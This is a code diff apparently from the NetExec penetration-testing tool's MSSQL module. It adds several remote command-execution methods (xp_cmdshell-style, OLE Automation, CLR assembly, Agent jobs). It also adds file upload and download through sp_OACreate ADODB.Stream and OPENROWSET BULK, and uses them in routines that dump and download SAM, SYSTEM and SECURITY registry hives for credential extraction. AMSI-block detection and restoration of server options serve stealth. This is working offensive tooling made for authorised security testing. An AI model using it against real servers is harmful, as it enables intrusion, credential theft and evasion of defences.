@@ -1,5 +1,6 @@
 import os
 import random
+import binascii
 import contextlib
 from termcolor import colored
 
@@ -12,6 +13,9 @@ from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.negotiate_parser import parse_challenge, login7_integrated_auth_error_message
 from nxc.helpers.powershell import create_ps_command
 from nxc.protocols.mssql.mssqlexec import MSSQLEXEC
+from nxc.protocols.mssql.oleexec import OLEEXEC
+from nxc.protocols.mssql.clrexec import CLREXEC
+from nxc.protocols.mssql.jobexec import JOBEXEC
 
 from impacket import tds, ntlm
 from impacket.krb5.ccache import CCache
@@ -44,6 +48,8 @@ class mssql(connection):
         self.lmhash = ""
         self.nthash = ""
         self.no_ntlm = False
+        self.args = args
+        self.backuped_options = {}
 
         connection.__init__(self, args, db, host)
 
@@ -317,31 +323,111 @@ class mssql(connection):
         return raw_output
 
     @requires_admin
-    def execute(self, payload=None, get_output=False):
-        payload = self.args.execute if not payload and self.args.execute else payload
-        if not payload:
-            self.logger.error("No command to execute specified!")
-            return None
+    def execute(self, payload=None, get_output=False, methods=None) -> str:
+        """
+        Executes a command on the target host using CMD.exe and the specified method(s).
 
-        get_output = True if not self.args.no_output else get_output
-        self.logger.debug(f"{get_output=}")
+        Args:
+        ----
+            payload (str): The command to execute
+            get_output (bool): Whether to get the output of the command (can be useful for AV evasion)
+            methods (list): The method(s) to use for command execution
 
-        output = ""
-        try:
-            exec_method = MSSQLEXEC(self.conn, self.logger)
-            output = exec_method.execute(payload)
-            self.logger.debug(f"Output: {output}")
-        except Exception as e:
-            self.logger.fail(f"Execute command failed, error: {e!s}")
-            return False
-        else:
-            if self.conn.lastError:
-                self.logger.fail(f"Error during command execution: {self.conn.lastError}")
+        Returns:
+        -------
+            str: The output of the command
+        """
+        if getattr(self.args, "exec_method_explicitly_set", False):
+            methods = [self.args.exec_method]
+        if not methods:
+            methods = ["mssqlexec", "oleexec", "clrexec"]
+
+        if not payload and self.args.execute:
+            payload = self.args.execute
+            if not self.args.no_output:
+                get_output = True
+
+        current_method = ""
+        for method in methods:
+            current_method = method
+            if method == "mssqlexec":
+                try:
+                    exec_method = MSSQLEXEC(self)
+                    self.logger.debug("MSSQLEXEC execution method instantiated")
+                    break
+                except Exception as e:
+                    self.logger.fail(f"Couldn't instantiate MSSQLEXEC method: {e!s}")
+                    continue
+            elif method == "oleexec":
+                try:
+                    exec_method = OLEEXEC(self)
+                    self.logger.debug("OLEEXEC execution method instantiated")
+                    break
+                except Exception as e:
+                    self.logger.fail(f"Couldn't instantiate OLEEXEC method: {e!s}")
+                    continue
+            elif method == "clrexec":
+                try:
+                    exec_method = CLREXEC(self)
+                    self.logger.debug("CLREXEC execution method instantiated")
+                    break
+                except Exception as e:
+                    self.logger.fail(f"Couldn't instantiate CLREXEC method: {e!s}")
+                    continue
+            elif method == "jobexec":
+                try:
+                    exec_method = JOBEXEC(self)
+                    self.logger.debug("JOBEXEC execution method instantiated")
+                    break
+                except Exception as e:
+                    self.logger.fail(f"Couldn't instantiate JOBEXEC method: {e!s}")
+                    continue
+        if "exec_method" in locals():
+
+            # This part is hacky because we need to be able to determine whether the user used -x/-X with a command
+            # Or with a custom assembly to execute.
+            clr_assembly_explicitly_set = getattr(self.args, "clr_assembly_explicitly_set", False)
+            if (self.args.execute is True or self.args.ps_execute is True) and not clr_assembly_explicitly_set:
+                if self.args.execute is True:
+                    self.logger.fail("-x requires a command to execute")
+                if self.args.ps_execute is True:
+                    self.logger.fail("-X requires a command to execute")
+                return ""
+
+            if method == "clrexec":
+                # if --clr-assembly is explicitly set then we don't have to provide the command to execute at all
+                # As such we overwrite it so that clrexec.py simply execute the provided CLR.
+                if getattr(self.args, "clr_assembly_explicitly_set", False):
+                    payload = None
+                # Otherwise we rely on the default assembly that calls cmd /c payload
+                output = exec_method.execute(payload, get_output, self.args)
             else:
-                self.logger.success("Executed command via mssqlexec")
-                for line in output.splitlines():
-                    self.logger.highlight(line.strip())
-        return output
+                output = exec_method.execute(payload, get_output)
+
+            try:
+                if not isinstance(output, str):
+                    output = output.decode(self.args.codec)
+            except UnicodeDecodeError:
+                self.logger.debug("Decoding error detected, consider running chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings")
+                output = output.decode("cp437")
+
+            self.logger.debug(f"Raw Output: {output}")
+            output = "\n".join([ll.rstrip() for ll in output.splitlines() if ll.strip()])
+            self.logger.debug(f"Cleaned Output: {output}")
+
+            if "This script contains malicious content" in output:
+                self.logger.fail("Command execution blocked by AMSI")
+                return ""
+
+            if (self.args.execute or self.args.ps_execute or self.args.clr_assembly_explicitly_set):
+                self.logger.success(f"Executed command via {current_method}")
+                if output:
+                    for line in output.split("\n"):
+                        self.logger.highlight(line)
+            return output
+        else:
+            self.logger.fail(f"Execute command failed with {current_method}")
+            return ""
 
     @requires_admin
     def ps_execute(self, payload=None, get_output=False, methods=None, force_ps32=False, obfs=False, encode=False):
@@ -371,30 +457,42 @@ class mssql(connection):
         return response
 
     @requires_admin
-    def put_file(self):
-        self.logger.display(f"Copy {self.args.put_file[0]} to {self.args.put_file[1]}")
-        with open(self.args.put_file[0], "rb") as f:
+    def put_file(self, download_path=None, remote_path=None):
+        if remote_path is None and download_path is None:
+            download_path = self.args.put_file[0]
+            remote_path = self.args.put_file[1]
+        self.logger.display(f"Copy {download_path} to {remote_path}")
+        with open(download_path, "rb") as f:
+            data = f.read()
+            self.logger.display(f"Size is {len(data)} bytes")
             try:
-                data = f.read()
-                self.logger.display(f"Size is {len(data)} bytes")
-                exec_method = MSSQLEXEC(self.conn, self.logger)
-                exec_method.put_file(data, self.args.put_file[1])
-                if exec_method.file_exists(self.args.put_file[1]):
-                    self.logger.success("File has been uploaded on the remote machine")
-                else:
-                    self.logger.fail("File does not exist on the remote system... error during upload")
+                self.backup_and_enable("advanced options")
+                self.backup_and_enable("Ole Automation Procedures")
+                hexdata = data.hex()
+                self.logger.debug(f"Hex data to write to file: {hexdata}")
+                query = f"DECLARE @ob INT;EXEC sp_OACreate 'ADODB.Stream', @ob OUTPUT;EXEC sp_OASetProperty @ob, 'Type', 1;EXEC sp_OAMethod @ob, 'Open';EXEC sp_OAMethod @ob, 'Write', NULL, 0x{hexdata};EXEC sp_OAMethod @ob, 'SaveToFile', NULL, '{remote_path}', 2;EXEC sp_OAMethod @ob, 'Close';EXEC sp_OADestroy @ob;"
+                self.logger.debug(f"Executing query: {query}")
+                self.conn.sql_query(query)
+                self.restore("Ole Automation Procedures")
+                self.restore("advanced options")
             except Exception as e:
-                self.logger.fail(f"Error during upload : {e}")
+                self.logger.debug(f"Error uploading via mssqlexec: {e}")
 
     @requires_admin
-    def get_file(self):
-        remote_path = self.args.get_file[0]
-        download_path = self.args.get_file[1]
+    def get_file(self, remote_path=None, download_path=None):
+        if remote_path is None and download_path is None:
+            remote_path = self.args.get_file[0]
+            download_path = self.args.get_file[1]
         self.logger.display(f'Copying "{remote_path}" to "{download_path}"')
 
         try:
-            exec_method = MSSQLEXEC(self.conn, self.logger)
-            exec_method.get_file(self.args.get_file[0], self.args.get_file[1])
+            query = f"SELECT * FROM OPENROWSET(BULK N'{remote_path}', SINGLE_BLOB) rs"
+            self.logger.debug(f"Executing query: {query}")
+            self.conn.sql_query(query)
+            data = self.conn.rows
+            self.logger.debug(f"Get file returned: {data}")
+            with open(download_path, "wb+") as f:
+                f.write(binascii.unhexlify(data[0]["BulkColumn"]))
             self.logger.success(f'File "{remote_path}" was downloaded to "{download_path}"')
         except Exception as e:
             self.logger.fail(f'Error reading file "{remote_path}": {e}')
@@ -564,12 +662,12 @@ class mssql(connection):
         get_owner_command = f"icacls C:\\windows\\temp\\{sam_storename} /grant {self.username}:F && icacls C:\\windows\\temp\\{system_storename} /grant {self.username}:F"
         output_filename = self.output_file_template.format(output_folder="sam")
         try:
-            exec_method = MSSQLEXEC(self.conn, self.logger)
-            exec_method.execute(dump_command)
-            exec_method.execute(get_owner_command)
-            exec_method.get_file(f"C:\\windows\\temp\\{sam_storename}", f"{output_filename}.sam")
-            exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
-            exec_method.execute(clean_command)
+            exec_method = MSSQLEXEC(self)
+            exec_method.execute(dump_command, True)
+            exec_method.execute(get_owner_command, True)
+            self.get_file(f"C:\\windows\\temp\\{sam_storename}", f"{output_filename}.sam")
+            self.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
+            exec_method.execute(clean_command, True)
         except Exception as e:
             self.logger.fail(f"Failed to dump SAM database, error: {e!s}")
             self.logger.debug(f"Error dumping SAM: {e}", exc_info=True)
@@ -599,12 +697,12 @@ class mssql(connection):
         get_owner_command = f"icacls C:\\windows\\temp\\{security_storename} /grant {self.username}:F && icacls C:\\windows\\temp\\{system_storename} /grant {self.username}:F"
         output_filename = self.output_file_template.format(output_folder="lsa")
         try:
-            exec_method = MSSQLEXEC(self.conn, self.logger)
-            exec_method.execute(dump_command)
-            exec_method.execute(get_owner_command)
-            exec_method.get_file(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
-            exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
-            exec_method.execute(clean_command)
+            exec_method = MSSQLEXEC(self)
+            exec_method.execute(dump_command, True)
+            exec_method.execute(get_owner_command, True)
+            self.get_file(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
+            self.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
+            exec_method.execute(clean_command, True)
         except Exception as e:
             self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
             self.logger.debug(f"Error dumping LSA: {e}", exc_info=True)
@@ -625,3 +723,46 @@ class mssql(connection):
             )
             LSA.dumpCachedHashes()
             LSA.dumpSecrets()
+
+    def _is_option_enabled(self, option):
+        query = f"EXEC master.dbo.sp_configure '{option}';"
+        self.logger.debug(f"Checking if '{option}' is enabled: {query}")
+        result = self.conn.sql_query(query)
+        self.logger.debug(f"'{option}' check result: {result}")
+        return bool(result and result[0]["config_value"] == 1)
+
+    @requires_admin
+    def backup_and_enable(self, option):
+        try:
+            self.backuped_options[option] = self._is_option_enabled(option)
+            if not self.backuped_options[option]:
+                self.logger.debug(f"Option '{option}' is disabled, enabling it.")
+                self.conn.sql_query(f"EXEC master.dbo.sp_configure '{option}', 1;RECONFIGURE;")
+            else:
+                self.logger.debug(f"Option '{option}' is already enabled.")
+        except Exception as e:
+            self.logger.error(f"Error enabling '{option}': {e}")
+
+    @requires_admin
+    def backup_and_disable(self, option):
+        try:
+            self.backuped_options[option] = self._is_option_enabled(option)
+            if self.backuped_options[option]:
+                self.logger.debug(f"Option '{option}' is enabled, disabling it.")
+                self.conn.sql_query(f"EXEC master.dbo.sp_configure '{option}', 0;RECONFIGURE;")
+            else:
+                self.logger.debug(f"Option '{option}' is already disabled.")
+        except Exception as e:
+            self.logger.error(f"Error disabling '{option}': {e}")
+
+    @requires_admin
+    def restore(self, option):
+        try:
+            original = self.backuped_options.get(option)
+            if original is None:
+                return
+            target_val = 1 if original else 0
+            self.logger.debug(f"Restoring '{option}' to {target_val}.")
+            self.conn.sql_query(f"EXEC master.dbo.sp_configure '{option}', {target_val};RECONFIGURE;")
+        except Exception as e:
+            self.logger.error(f"[OPSEC] Error restoring '{option}': {e}")
